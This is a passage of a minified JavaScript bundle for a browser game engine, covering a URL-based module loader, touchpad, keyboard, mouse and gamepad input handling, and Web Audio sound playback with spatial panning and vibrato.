import{e as Us,d as Ye,j as js,b as Hs,n as Xe,k as Ws}from"./vendor.js";import{e as Bs,h as ps,a as xt,s as Ys,g as Xs,b as ne,r as Gs,c as Fs,d as Ge,f as Ks,i as Zs,j as Js,k as Qs,S as ti,__tla as __tla_0}from"./Util.js";import{r as ei,t as ds,g as si,a as ii,n as v,V as Q,o as J,s as Fe,b as A,c as at,E as C,d as At,e as et,f as g,h as re,i as Ke,j as ai,k as ni,u as ri,l as oi,m as li,p as Ot,q as fs,v as u,w as ms,x as ys,y as oe,W as j,z as K,A as ci,F as hi,B as ee,C as ui,M as gt,I as bt,D as Ze,S as pi,T as di,G as Je,H as fi,J as mi,K as yi,L as gi,N as bi,O as Qe,P as ts,Q as ut,R as es,U as wi,X as st,Y as se,Z as ss,_ as vi,$ as is,a0 as xi,a1 as Ai,a2 as ie,a3 as ki,a4 as as,a5 as Pi,a6 as ae,a7 as Ei,a8 as Ti,a9 as Si,aa as ns,ab as $i,__tla as __tla_1}from"./Resolution.js";import{g as Mi,R as Ci,__tla as __tla_2}from"./Font.js";import{I as B,S as Di,__tla as __tla_3}from"./parameters.js";import{d as Z,a as rs,b as E,A as Ri,__tla as __tla_4}from"./manager.js";import{e as _i,__tla as __tla_5}from"./Timer.js";import{c as zi,a as qi}from"./data.js";import{__tla as __tla_6}from"./TimeLaps.js";Promise.all([(()=>{try{return __tla_0}catch{}})(),(()=>{try{return __tla_1}catch{}})(),(()=>{try{return __tla_2}catch{}})(),(()=>{try{return __tla_3}catch{}})(),(()=>{try{return __tla_4}catch{}})(),(()=>{try{return __tla_5}catch{}})(),(()=>{try{return __tla_6}catch{}})()]).then((async()=>{const os=/^(\.+\/|^http[s]*:|^file:)/;function Ii(b){return fetch(b).then((t=>t.text()))}function Vi(b,t,s){return b}function Li(b){const t=new Map,s=new Map;return{name:"browser",resolveId:(i,e)=>os.test(i)?function(l,a,c){let h=l,o=a;if(void 0!==o)do{h=`${Ye(o)}/${js(Ye(l),Hs(l))}`,o=a?c.get(a):o}while(o);let p=null;try{const{origin:d,pathname:w}=new URL(h);p=`${d}/${Xe(w.replace(/^\//,""))}`}catch{p=Xe(h)}finally{null!==p&&void 0!==o&&c.set(p,o)}return p}(i,e||"",t):null,async load(i,e,l,a,c,h){let o=null;return os.test(i)&&(o=s.get(i)||null,null===o&&(o=await(b.request||Ii)(i).then((p=>(b.process||Vi)(p,i,Us(i).replace(/^\./,"")))),null!==o&&s.set(i,o))),o}}}function Ni(b,t,s){switch(!0){case/\.worker\.js$/.test(t):return`export class ImportWorker extends Worker { constructor (...args) { return super("${ds("text/javascript",b)}", ...args); } }`;case/^(js)$/.test(s):return b;case/^(json)$/.test(s):return`export ${b};`;case/^(txt|glsl|frag|vert)$/.test(s):return`export unescape("${escape(b)}");`}return null}async function Oi(b){return(await si(b)).source}class le{constructor(t,s=1,i){this.presss=new Array,this.axess=new Array,this.changes=new Array,this.axesNames=new Array,this.keys={},this.type=t,this.inputs=i,this.sensibility=s,ii((e=>!e&&this.clear()))}getType(){return this.type}getInputManager(){return this.inputs}changeDevice(){const t=this.getType();this.inputs.setInputType(t),this.inputs.post("changedevice",{name:"device",value:[t]}),this.changes.forEach((s=>s(this)))}firePress(t,s){this.inputs.post("press",{name:t,value:[s?1:0]}),this.presss.forEach((i=>i(t,s)))}fireAxes(t,s,i){this.axesNames.includes(t)||this.axesNames.push(t);let e=s,l=i;"y"===t&&(e*=this.sensibility,l*=this.sensibility),e=v(s,0),l=v(i,0),this.inputs.post("axes",{name:t,value:[e,l]}),this.axess.forEach((a=>a(t,e,l)))}reservePress(t){!this.presss.includes(t)&&this.presss.push(t)}reserveAxes(t){!this.axess.includes(t)&&this.axess.push(t)}reserveChange(t){!this.changes.includes(t)&&this.changes.push(t)}clear(){const t=Object.keys(this.keys);for(let s=0,i=0|t.length;s<i;s=s+1|0){const e=t[s];this.keys[e]&&(this.firePress(e,!1),this.keys[e]=!1)}this.axesNames.forEach((s=>{this.inputs.post("axes",{name:s,value:[0,0]})}))}update(){}rendering(){}}function wt(b){return(b||"").length>0?(b||"").split(" "):[]}class Ui extends le{constructor(t,s,i,e){super(B.TOUCHPAD,t,i),this.pointer=new Q(0,0),this.actions=new Map,this.size=300,this.isInit=!1,this.visible=!1,this.isRequestAxesResetTime=-1,this.controlElement=s,this.html=e,J(this.getInputManager().getMessagePort(),((l,a,c)=>{"stick"===l&&this.changeStick(c.name,c.value)}))}query(t){return[].slice.call(this.controlElement.querySelectorAll(t))}pressAction(t){this.actions.get(t)||(this.actions.set(t,!0),this.firePress(`touchpad_${t}`,!0))}releaseAction(t){this.actions.get(t)&&(this.actions.set(t,!1),this.firePress(`touchpad_${t}`,!1))}hasAction(t){return this.actions.get(t)||!1}init(){this.isInit||(this.isInit=!0,Fe(this.controlElement,this.html),this.query(".touch-cross").forEach((t=>{const s=`calc(${t.getAttribute("size")} / 3.0)`,i=t.hasAttribute("max-size")?`calc(${t.getAttribute("max-size")} / 3.0)`:"",e=t.hasAttribute("capture"),l=wt(t.getAttribute("secondary")),a=parseInt(t.getAttribute("interval")||"0")||300,c=t.getAttribute("press-up")||"",h=t.getAttribute("press-down")||"",o=t.getAttribute("press-right")||"",p=t.getAttribute("press-left")||"";let d=null,w=null;Fe(t,`<div class="touch-layer" size="${s}"${i.length>0?` max-size="${i}"`:""} bottom="50%" left="50%" color="${t.getAttribute("color")}" font="${t.getAttribute("font")}"></div><div class="touch-layer" button-name="${c}" size="${s}"${i.length>0?` max-size="${i}"`:""} bottom="50% + ${s}" left="50%" color="${t.getAttribute("color")}" font="${t.getAttribute("font")}" style="border-top-right-radius:5px; border-top-left-radius:5px;"></div><div class="touch-layer" button-name="${h}" size="${s}"${i.length>0?` max-size="${i}"`:""} bottom="50% - ${s}" left="50%" color="${t.getAttribute("color")}" font="${t.getAttribute("font")}" style="border-bottom-right-radius:5px; border-bottom-left-radius:5px;"></div><div class="touch-layer" button-name="${o}" size="${s}"${i.length>0?` max-size="${i}"`:""} bottom="50%" left="50% + ${s}" color="${t.getAttribute("color")}" font="${t.getAttribute("font")}" style="border-top-right-radius:5px; border-bottom-right-radius:5px;"></div><div class="touch-layer" button-name="${p}" size="${s}"${i.length>0?` max-size="${i}"`:""} bottom="50%" left="50% - ${s}" color="${t.getAttribute("color")}" font="${t.getAttribute("font")}" style="border-top-left-radius:5px; border-bottom-left-radius:5px;"></div>`);let y="none";const m=S=>{if(e||(S.preventDefault(),S.stopPropagation()),null===S.target)return;const $=t.getBoundingClientRect(),R=$.left,nt=$.top;let k="none";if(S instanceof TouchEvent){const x=S.target.clientWidth/3;[...S.changedTouches].forEach((D=>{if(D.target!==t)return;const T=D.pageX-R,M=D.pageY-nt;if(T<x||T>2*x||M<x||M>2*x)switch(!0){case T<x&&M<x:k=`${c} ${p}`;break;case T>2*x&&M<x:k=`${c} ${o}`;break;case M>2*x&&T<x:k=`${h} ${p}`;break;case T>2*x&&M>2*x:k=`${h} ${o}`;break;case T>x&&T<2*x&&M<x:k=c;break;case T>x&&M>2*x&&T<2*x:k=h;break;case M>x&&T<x&&M<2*x:k=p;break;case T>2*x&&M>x&&M<2*x:k=o}}))}if(y!==k){const x=Array.prototype.slice.call(t.children);y.split(" ").forEach((D=>this.releaseAction(D))),k.split(" ").forEach((D=>this.pressAction(D))),x.forEach((D=>{if(D.hasAttribute("button-name")){const T=D.getAttribute("button-name");if(null===T)return;-1!==k.indexOf(T)?et(D,"backgroundColor",t.getAttribute("hover")||""):-1!==y.indexOf(T)&&et(D,"backgroundColor",t.getAttribute("color")||"")}}))}y=k},I=S=>{e||(S.preventDefault(),S.stopPropagation()),l.forEach(($=>this.releaseAction($))),y.split(" ").forEach(($=>this.releaseAction($))),[].slice.call(t.children).forEach(($=>{const R=$.getAttribute("button-name");null!==R&&y.includes(R)&&et($,"backgroundColor",t.getAttribute("color")||"")})),y="none"};t instanceof HTMLElement&&(A(t,"touchstart",(S=>{const $=S.timeStamp;m(S),w?.destroy(),null!==d&&$-d<a?l.forEach((R=>this.pressAction(R))):(d=$,w=g((()=>{d=null}),a))}),{passive:!1,capture:e}),A(t,"touchmove",m,{passive:!1,capture:e}),A(t,"touchend",I,e),A(t,"touchcancel",I,e))})),this.query(".touch-axes").forEach((t=>{let s=-1,i=-1,e=-1;const l=a=>{a.preventDefault(),[...a.changedTouches].forEach((({identifier:c,clientX:h,clientY:o})=>{s===c&&(s=-1,i=-1,e=-1,"y"===t.getAttribute("name")&&(this.pointer.x=0,this.pointer.y=0),this.fireAxes(t.getAttribute("name")||"",0,0))}))};t instanceof HTMLElement&&(A(t,"touchstart",(a=>{a.preventDefault(),[...a.changedTouches].forEach((({identifier:c,clientX:h,clientY:o})=>{-1===s&&-1===i&&-1===e&&(s=c,i=h,e=o)}))}),{passive:!1}),A(t,"touchmove",(a=>{a.preventDefault();let c=0,h=0;[...a.changedTouches].forEach((({identifier:o,clientX:p,clientY:d})=>{if(s===o)if(-1!==i&&-1!==e&&(c=p-i,h=d-e),t.hasAttribute("stick")||(i=p,e=d),"y"===t.getAttribute("name")){const w=c/this.size,y=h/this.size;t.hasAttribute("stick")||this.getInputManager().checkUpdate("axes","y")?(this.pointer.x=w,this.pointer.y=y):(this.pointer.x+=w,this.pointer.y+=y),t.hasAttribute("stick")||(this.isRequestAxesResetTime=at()+10),this.fireAxes("y",this.pointer.x,this.pointer.y)}else{const w=c/this.size,y=h/this.size;this.fireAxes(t.getAttribute("name")||"",w,y)}}))}),{passive:!1}),A(t,"touchend",l),A(t,"touchcancel",l))})),this.query("[primary]").forEach((t=>{const s=at(),i=wt(t.getAttribute("primary")),e=wt(t.getAttribute("secondary")),l=t.hasAttribute("capture"),a=t.hasAttribute("exit");let c,h,o=parseInt(t.getAttribute("interval")||"0"),p=null,d=null,w=!1;if(isNaN(o))switch(!0){case t.hasAttribute("hold"):o=150;break;case t.hasAttribute("double"):o=225;break;case t.hasAttribute("quick"):o=275;break;default:o=0}switch(!0){case t.hasAttribute("hold"):c=y=>{l||(y.preventDefault(),y.stopPropagation()),d?.destroy(),d=g((()=>{w=!0,e.forEach((m=>this.pressAction(m)))}),o),i.forEach((m=>this.releaseAction(m)))};break;case t.hasAttribute("double"):c=y=>{l||(y.preventDefault(),y.stopPropagation()),null!==p&&s-p<o?(p=null,d?.destroy(),e.forEach((m=>this.pressAction(m)))):(p=s,d?.destroy(),d=g((()=>{w=!0,p=null,i.forEach((m=>this.pressAction(m)))}),o))};break;case t.hasAttribute("quick"):c=y=>{l||(y.preventDefault(),y.stopPropagation()),null!==p&&s-p<o?(p=null,e.forEach((m=>this.pressAction(m)))):(p=s,i.forEach((m=>this.pressAction(m))))};break;default:c=y=>{l||(y.preventDefault(),y.stopPropagation()),i.forEach((m=>this.pressAction(m)))}}switch(!0){case t.hasAttribute("hold"):h=y=>{l||(y.preventDefault(),y.stopPropagation()),d?.destroy(),w?(w=!1,e.forEach((m=>this.releaseAction(m)))):(i.forEach((m=>this.pressAction(m))),d=g((()=>{i.forEach((m=>this.releaseAction(m)))}),o))};break;case t.hasAttribute("double"):h=y=>{l||(y.preventDefault(),y.stopPropagation()),w?(w=!1,i.forEach((m=>this.releaseAction(m)))):d?.destroy(),e.forEach((m=>this.releaseAction(m)))};break;case t.hasAttribute("quick"):default:h=y=>{l||(y.preventDefault(),y.stopPropagation()),i.forEach((m=>this.releaseAction(m))),e.forEach((m=>this.releaseAction(m)))}}t instanceof HTMLElement&&(A(t,"touchstart",c,{passive:!1,capture:l}),A(t,"touchend",h,l),A(t,"touchcancel",h,l),a&&A(t,"touchend",(()=>{this.visible&&new C(this,"exit").triggerSync(),this.hide()})))})),this.query(".touch-button, .touch-layout, .touch-layer").forEach((t=>{let s=null,i=null,e=null,l=null;t.hasAttribute("size")?s=i=t.getAttribute("size"):(s=t.getAttribute("width"),i=t.getAttribute("height")),t.hasAttribute("max-size")?e=l=t.getAttribute("max-size"):(e=t.getAttribute("max-width"),l=t.getAttribute("max-height")),At(t,{width:s||"",height:i||"",maxWidth:e||"",maxHeight:l||"",top:`calc(${t.getAttribute("top")} - ${i} / 2)`,bottom:`calc(${t.getAttribute("bottom")} - ${i} / 2)`,left:`calc(${t.getAttribute("left")} - ${s} / 2)`,right:`calc(${t.getAttribute("right")} - ${s} / 2)`})})),this.query(".touch-button, .touch-layer").forEach((t=>{let s=null,i=null;t.hasAttribute("size")?s=i=t.getAttribute("size")||"":(s=t.getAttribute("width")||"",i=t.getAttribute("height")||""),t.hasAttribute("radius")&&et(t,"borderRadius",`${(t.getAttribute("radius")||"").length>0?t.getAttribute("radius"):`${/%$/.test(s)||/%$/.test(i)?"50vw":parseFloat((s.match(/^[0-9.]+/)||["0"])[0])<parseFloat((i.match(/^[0-9.]+/)||["0"])[0])?s:i}`}`),At(t,{backgroundColor:`${t.getAttribute("color")}`,color:`${t.getAttribute("font")}`})})),this.updateVisible())}reserveExit(t){new C(this,"exit").on(t)}changeDevice(){this.visible||super.changeDevice(),this.visible=!0}hide(){this.visible=!1}hasVisible(){return this.visible}updateVisible(){this.controlElement&&et(this.controlElement,"display",ps()&&this.visible?"block":"none")}changeStick(t,s){[...document.querySelectorAll(`.touch-axes[name="${t}"]`)].forEach((i=>{null!==i&&(s?i.setAttribute("stick","stick"):i.removeAttribute("stick"))}))}update(){this.init();const t=at();-1!==this.isRequestAxesResetTime&&this.isRequestAxesResetTime<t&&(this.isRequestAxesResetTime=-1,this.pointer.x=0,this.pointer.y=0,this.fireAxes("y",this.pointer.x,this.pointer.y))}rendering(){null!==this.controlElement&&(this.updateVisible(),this.query(".touch-hover").forEach((t=>{t.hasAttribute("hover")&&(et(t,"backgroundColor",t.getAttribute("color")||""),wt(t.getAttribute("primary")).concat(wt(t.getAttribute("secondary"))).forEach((s=>{this.hasAction(s)&&et(t,"backgroundColor",t.getAttribute("hover")||"")})))})))}}const ls={8:"backspace",9:"tab",13:"enter",16:"shift",17:"control",18:"alt",19:"pause_break",20:"caps_lock",27:"escape",32:"space",33:"page_up",34:"page_down",35:"end",36:"home",37:"left_arrow",38:"up_arrow",39:"right_arrow",40:"down_arrow",45:"insert",46:"delete",48:"0",49:"1",50:"2",51:"3",52:"4",53:"5",54:"6",55:"7",56:"8",57:"9",65:"a",66:"b",67:"c",68:"d",69:"e",70:"f",71:"g",72:"h",73:"i",74:"j",75:"k",76:"l",77:"m",78:"n",79:"o",80:"p",81:"q",82:"r",83:"s",84:"t",85:"u",86:"v",87:"w",88:"x",89:"y",90:"z",91:"left_window_key",92:"right_window_key",93:"select_key",96:"numpad_0",97:"numpad_1",98:"numpad_2",99:"numpad_3",100:"numpad_4",101:"numpad_5",102:"numpad_6",103:"numpad_7",104:"numpad_8",105:"numpad_9",106:"multiply",107:"add",109:"subtract",110:"decimal_point",111:"divide",112:"f1",113:"f2",114:"f3",115:"f4",116:"f5",117:"f6",118:"f7",119:"f8",120:"f9",121:"f10",122:"f11",123:"f12",144:"num_lock",145:"scroll_lock",186:"semi_colon",187:"equal_sign",188:"comma",189:"dash",190:"period",191:"forward_slash",192:"grave_accent",219:"open_bracket",220:"back_slash",221:"close_braket",222:"single_quote"},F={0:"none",1:"left",2:"middle",3:"right",4:"wheel_down",5:"wheel_up"};class gs extends le{constructor(t,s,i){super(B.KEYBOARD,t,i),this.pointer=new Q(0,0),this.curs=new Q(0,0),this.cursors=new Array,this.size=220,this.isPointerLockPoint=!1,this.isRequestAxesResetTime=-1,this.isRequestMouseWheelUpResetTime=-1,this.isRequestMouseWheelDownResetTime=-1,J(this.getInputManager().getMessagePort(),((e,l,a)=>{"stick"===e&&this.setPointerLookPoint(a.value)})),A(self.document.body,"keydown",(e=>{e.preventDefault(),e.stopPropagation();const l=`keyboard_${ls[e.keyCode]}`;return this.keys[l]||(this.keys[l]=!0,this.firePress(l,!0)),!1})),A(self.document.body,"keyup",(e=>{e.preventDefault(),e.stopPropagation();const l=`keyboard_${ls[e.keyCode]}`;return this.keys[l]&&(this.keys[l]=!1,this.firePress(l,!1)),!1})),s.forEach(((e,l)=>{if(!(e instanceof HTMLElement))return;0===l&&Ys(e),A(e,"mousedown",(h=>{if(h.preventDefault(),h.stopPropagation(),"none"===e.style.display)return;const o=`mouse_${F[h.which]}`;return this.keys[o]=!0,this.firePress(o,!0),!1})),A(e,"wheel",(h=>{if(h.preventDefault(),h.stopPropagation(),"none"===e.style.display)return;const o=`mouse_${F[h.deltaY>0?4:5]}`;return this.keys[o]=!0,this.firePress(o,!0),this.keys[`mouse_${F[4]}`]&&(this.isRequestMouseWheelUpResetTime=at()+10),this.keys[`mouse_${F[5]}`]&&(this.isRequestMouseWheelDownResetTime=at()+10),!1}),{passive:!1}),A(e,"mouseup",(h=>{if(h.preventDefault(),h.stopPropagation(),"none"===e.style.display)return;const o=`mouse_${F[h.which]}`;return this.keys[o]=!1,this.firePress(o,!1),!1}));let a=e.clientWidth,c=e.clientHeight;A(e,"mousemove",(h=>{if(h.preventDefault(),h.stopPropagation(),"none"===e.style.display)return;const o=e.clientWidth,p=e.clientHeight;if(a!==o||c!==p)return a=o,void(c=p);if(xt()){if(this.isPointerLockPoint){const d=Math.min(e.clientWidth,e.clientHeight),w=h.movementX/d,y=h.movementY/d,[m,I]=re(w,y);this.pointer.x+=m,this.pointer.y+=I}else{const d=h.movementX/this.size,w=h.movementY/this.size;this.getInputManager().checkUpdate("axes","y")?(this.pointer.x=d,this.pointer.y=w):(this.pointer.x+=d,this.pointer.y+=w)}this.fireAxes("y",this.pointer.x,this.pointer.y),this.isPointerLockPoint||(this.isRequestAxesResetTime=at()+10)}else this.curs.x=h.offsetX/e.clientWidth,this.curs.y=h.offsetY/e.clientHeight,this.fireCursor(this.curs.x,this.curs.y);return!1}))}))}reserveCursor(t){!this.cursors.includes(t)&&this.cursors.push(t)}fireCursor(t,s){const i=v(t,0),e=v(s,0);this.getInputManager().post("cursor",{name:"cursor",value:[i,e]}),this.cursors.forEach((l=>l(i,e)))}setPointerLookPoint(t=!this.isPointerLockPoint){t!==this.isPointerLockPoint&&(!this.isPointerLockPoint||0===this.pointer.x&&0===this.pointer.y||(this.pointer.x=0,this.pointer.y=0,this.fireAxes("y",this.pointer.x,this.pointer.y)),this.isPointerLockPoint=t)}hasPointerLookPoint(){return this.isPointerLockPoint}update(){const t=at();-1!==this.isRequestAxesResetTime&&this.isRequestAxesResetTime<t&&(this.isRequestAxesResetTime=-1,this.pointer.x=0,this.pointer.y=0,this.fireAxes("y",this.pointer.x,this.pointer.y)),-1!==this.isRequestMouseWheelUpResetTime&&this.isRequestMouseWheelUpResetTime<t&&(this.isRequestMouseWheelUpResetTime=-1,this.keys[`mouse_${F[4]}`]=!1,this.firePress(`mouse_${F[4]}`,!1)),-1!==this.isRequestMouseWheelDownResetTime&&this.isRequestMouseWheelDownResetTime<t&&(this.isRequestMouseWheelDownResetTime=-1,this.keys[`mouse_${F[5]}`]=!1,this.firePress(`mouse_${F[5]}`,!1))}}const cs={axes:{left:[0,1],right:[2,3]},buttons:{a:0,b:1,x:2,y:3,lb:4,rb:5,lt:6,rt:7,select:8,start:9,ls:10,rs:11,up:12,down:13,left:14,right:15,home:16}};class ji extends le{constructor(t,s,i){super(B.GAMEPAD,t,i),this.isConnectGamepad=!1,this.addx=0,this.addy=0,this.addd=0,this.addl=0,this.buttons=new Array,this.pushs={},this.haptics=new Array,this.setting=s}addHaptics(...t){this.haptics.push(...t)}update(){const t=Xs(),s=[...t].some((e=>null!==e&&e.connected));this.isConnectGamepad!==s&&(this.isConnectGamepad=s,new C(this,"changeconnect").triggerSync({value:s}));let i=!1;for(let e=0,l=0|t.length;e<l;e=e+1|0){const a=t[e];if(null===a||!a.connected||"standard"!==a.mapping||a.id.includes("Unknown Gamepad"))continue;const{axes:c}=cs,h=Ke(a.axes[c.left[0]],-a.axes[c.left[1]],0,0),o=Ke(a.axes[c.right[0]],a.axes[c.right[1]],0,0),p=new Q(Math.max(Math.abs(Math.cos(h)),Math.abs(Math.sin(h))),Math.max(Math.abs(Math.cos(o)),Math.abs(Math.sin(o)))),d=p.x*this.setting.getStickInnerDeadzoneX(),w=p.y*this.setting.getStickInnerDeadzoneY(),y=p.x*this.setting.getStickOuterDeadzoneX(),m=p.y*this.setting.getStickOuterDeadzoneY();let I=Math.min(1,Math.max(-1,(a.axes[c.left[0]]>0?Math.max(a.axes[c.left[0]]-d,0):Math.min(a.axes[c.left[0]]+d,0))/Math.max(0,1-d-y))),S=Math.min(1,Math.max(-1,(-a.axes[c.left[1]]>0?Math.max(-a.axes[c.left[1]]-d,0):Math.min(-a.axes[c.left[1]]+d,0))/Math.max(0,1-d-y))),$=Math.min(1,Math.max(-1,(a.axes[c.right[0]]>0?Math.max(a.axes[c.right[0]]-w,0):Math.min(a.axes[c.right[0]]+w,0))/Math.max(0,1-w-m))),R=Math.min(1,Math.max(-1,(a.axes[c.right[1]]>0?Math.max(a.axes[c.right[1]]-w,0):Math.min(a.axes[c.right[1]]+w,0))/Math.max(0,1-w-m)));[I,S]=re(I,S),[$,R]=re($,R),this.addx===I&&this.addy===S||(this.fireAxes("x",I,S),this.addx=I,this.addy=S),this.addd===$&&this.addl===R||(this.fireAxes("y",$,R),this.addd=$,this.addl=R);const nt=ai(this.buttons);ni(this.buttons),a.buttons.forEach(((k,x)=>{if(!k)return;const{buttons:D}=cs;for(const T in D){const M=`gamepad_${T}`;D[T]===x&&k.pressed&&(this.pushs[M]||(this.firePress(M,!0),this.pushs[M]=!0),this.buttons.push(M))}})),nt.forEach((k=>{!this.buttons.includes(k)&&this.pushs[k]&&(this.firePress(k,!1),this.pushs[k]=!1)})),i=!0;break}i||(0===this.addx&&0===this.addy||(this.fireAxes("x",0,0),this.addx=0,this.addy=0),0===this.addd&&0===this.addl||(this.fireAxes("y",0,0),this.addd=0,this.addl=0),this.buttons.forEach((h=>{this.pushs[h]&&(this.firePress(h,!1),this.pushs[h]=!1)})))}}class Hi{constructor(t,s,i,e,l,a=null){this.buffer=null,this.lfo=null,this.depth=null,this.oscillator=null,this.isStop=!1,this.isAjastSpeed=!0,this.id=t,this.src=i,this.context=e,this.source=e.createBufferSource(),this.volume=e.createGain(),this.target=a,this.sounds=s,this.volume.connect(l),null!==this.target?(this.panner=e.createPanner(),this.source.connect(this.panner).connect(this.volume)):(this.panner=null,this.source.connect(this.volume));const c=()=>{this.source.start(e.currentTime)},h=()=>{this.source.onended=null,new C(this,"play").off(c),new C(this,"stop").off(h)};this.source.onended=()=>{this.stop()},new C(this,"play").on(c),new C(this,"stop").on(h)}initVibrato(){null!==this.lfo&&null!==this.depth&&null!==this.oscillator||(this.lfo=this.context.createOscillator(),this.depth=this.context.createGain(),this.oscillator=this.context.createOscillator(),this.oscillator.connect(this.volume).connect(this.context.destination),this.lfo.connect(this.depth).connect(this.oscillator.frequency),this.lfo.start())}getID(){return this.id}play(t,s=!1){this.buffer=t,this.sounds.hasPlay()?this.hasPlay()?this.isStop&&(this.isStop=!1,new C(this,"play").triggerSync()):(this.source.buffer=this.buffer,this.source.loop=s,new C(this,"play").triggerSync()):this.stop()}pause(){this.hasPlay()&&(this.source.stop(),this.isStop=!0,new C(this,"pause").triggerSync())}stop(){new C(this,"stop").triggerSync()}hasPlay(){return null!==this.source.buffer}getSrc(){return this.src}setVolume(t){return this.volume.gain.value=v(t,0),this}setSpeed(t){return this.isAjastSpeed?this.source.playbackRate.value=v(t,0):this.source.playbackRate.value=1,this}setAjastSpeed(t){this.isAjastSpeed=t}setTarget(t){return this.target=t,this}setOscillatorType(t="sine"){return null!==t&&(this.initVibrato(),null!==this.oscillator&&(this.oscillator.type=t)),this}setVibratoSpeed(t=0){return 0!==t&&(this.initVibrato(),null!==this.lfo&&(this.lfo.frequency.value=0|v(t,0))),this}setVibratoDepth(t=0){return 0!==t&&(this.initVibrato(),null!==this.depth&&(this.depth.gain.value=0|v(t,0))),this}update(){if(null!==this.target&&null!==this.panner)try{this.panner.positionX.setValueAtTime(v(this.target.x,0),this.context.currentTime),this.panner.positionY.setValueAtTime(v(this.target.y,0),this.context.currentTime),this.panner.positionZ.setValueAtTime(v(this.target.z,0),this.context.currentTime)}catch{this.panner.setPosition(v(this.target.x,0),v(this.target.y,0),v(this.target.z,0))}}destroy(){var t;this.source.disconnect(),this.source.buffer=null,null===(t=this.panner)||void 0===t||t.disconnect(),this.volume.disconnect(),new C(this,"destroy").triggerSync()}onstop(){this.destroy()}}class Wi{constructor(t){this.context=ri(new AudioContext),this.sounds=new Map,this.center=null,this.isPlay=!0,this.id=t,this.volume=this.context.createGain(),this.volume.connect(this.context.destination)}getID(){return this.id}getSound(t){return this.sounds.get(t)||null}getSounds(){return this.sounds}createSound(t,s=null,i){var e;null===(e=this.getSound(i))||void 0===e||e.stop();const l=new Hi(i,this,t,this.context,this.volume,s);this.sounds.set(i,l);const a=()=>{new C(l,"stop").off(a),this.sounds.delete(i)};return new C(l,"stop").on(a),l}hasSound(t){var s;return!(null===(s=this.sounds.get(t))||void 0===s||!s.hasPlay())}play(){this.isPlay||(this.context.resume(),this.isPlay=!0)}pause(){this.isPlay&&(this.context.suspend(),this.isPlay=!1)}stop(){this.sounds.forEach((t=>{t.stop()})),this.isPlay=!1}setVolume(t){return this.volume.gain.value=v(t,0),this}setSpeed(t){return this.sounds.forEach((s=>{s.setSpeed(t)})),this}setCenter(t){this.center=t}getVolume(){return this.volume.gain.value}getContext(){return this.context}hasPlay(){return this.isPlay}update(){if(null!==this.center){const{position:t,direction:s}=this.center,[i,e,l]=oi(s.x,s.y),[a,c,h]=li(s.x,s.y),o=this.context.listener;try{o.positionX.setValueAtTime(v(t.x,0),this.context.currentTime),o.positionY.setValueAtTime(v(t.y,0),this.context.currentTime),o.positionZ.setValueAtTime(v(t.z,0),this.context.currentTime),o.forwardX.setValueAtTime(v(i,0),this.context.currentTime),o.forwardY.setValueAtTime(v(e,0),this.context.currentTime),o.forwardZ.setValueAtTime(v(l,0),this.context.currentTime),o.upX.setValueAtTime(v(a,0),this.context.currentTime),o.upY.setValueAtTime(v(c,0),this.context.currentTime),o.upZ.setValueAtTime(v(h,0),this.context.currentTime)}catch{o.setPosition(v(t.x,0),v(t.y,0),v(t.z,0)),o.setOrientation(v(i,0),v(e,0),v(l,0),v(a,0),v(c,0),v(h,0))}}this.sounds.forEach((t=>{t.update()}))}destroy(){this.sounds.forEach((t=>{t.destroy()})),this.volume.disconnect(),this.context.close(),new C(this,"destroy").triggerSync()}}class Bi{constructor(t){this.contexts=new Map,this.nowSceneName=null,this.isPause=!1,this.oldPause=!1,this.assets=t}createContext(t){if(this.hasContext(t))throw new TypeError(`Not redefine audio context is "${t}"`);const s=new Wi(t);return this.contexts.set(t,s),s}getContext(t){return this.contexts.get(t)||null}hasContext(t){return this.contexts.has(t)}play(){this.isPause=!1}pause(){this.isPause=!0}getNowSceneName(){return this.nowSceneName}createTransferData(t){const s=new Array,i=this.contexts.get(t)||null;return null!==i&&i.getSounds().forEach((e=>{e.hasPlay()&&s.push(e.getID())})),{lives:s,sceneName:t}}applyData(t,s,i){let e=null;if(e=this.hasContext(s)?this.getContext(s):this.createContext(s),null===e)return;this.nowSceneName!==s&&(this.contexts.forEach((a=>{a!==e&&a?.pause()})),e.play(),this.nowSceneName=s),e.setCenter(t.center),e.setVolume(i*t.volume);const l=Object.keys(t.sounds);for(let a=0,c=0|l.length;a<c;a=a+1|0){const h=l[a],o=t.sounds[h];let p=null;if(p=o.init?e.getSound(o.id):e.createSound(o.src,o.target,o.id),null!==p){if(o.isPlay){if(!p.hasPlay()){const d=this.assets.getAssetSource(p.getSrc())||null;null!==d&&p.play(d)}}else p.pause();p.setVolume(o.volume),p.setSpeed(o.speed*t.speed),p.setAjastSpeed(o.isAjastSpeed),p.setTarget(o.target),p.setOscillatorType(o.oscillatorType),p.setVibratoSpeed(o.vibratoSpeed),p.setVibratoDepth(o.vibratoDepth)}}if(e.getSounds().forEach((a=>{Object.hasOwn(t.sounds,a.getID())||a.stop()})),this.isPause!==this.oldPause)if(this.oldPause=this.isPause,this.isPause)this.contexts.forEach((a=>{a.pause()}));else{const a=this.getNowSceneName();if(null===a)return;const c=this.getContext(a);null!==c&&c.play()}}update(){const t=null!==this.nowSceneName?this.getContext(this.nowSceneName):null;null!==t&&t.update()}rendering(){}destroy(){this.contexts.forEach((t=>{t.destroy()})),new C(this,"destroy").triggerSync()}}class Yi{constructor(t){this.buffers=new Map,this.reserves=new Map,this.controls=new Array,this.inits=new Array,this.buttons={},this.axes={x:new Q(0,0),y:new Q(0,0),z:new Q(0,0)},this.pointer=new Q(0,0),this.inputType=B.NONE,this.isStart=!1,J(t,((s,i,e)=>{var l,a,c;switch(s){case"success":{let h=this.buffers.get(e.type)||null;null===h&&this.buffers.set(e.type,h=new Map);let o=h.get(e.name)||null;if(null===o){const p={name:e.name,value:Ot("float32",0),updater:Ot("float32",1),init:!0};h.set(e.name,o=p)}o.updater[0]=1;break}case"clear":this.controls.forEach((h=>h.clear()));break;case"buffer":{const h=(null===(l=this.buffers.get(e.type))||void 0===l?void 0:l.get(e.name))||null;null!==h&&(h.init=!0);const o=(null===(a=this.reserves.get(e.type))||void 0===a?void 0:a.get(e.name))||[];for(;o.length>0;)null===(c=o.shift())||void 0===c||c.call(this);break}}})),this.channel=t}getMessagePort(){return this.channel}start(){if(!this.isStart)for(this.isStart=!0;this.inits.length>0;){const t=this.inits.shift()||null;null!==t&&t()}}getInputType(){return 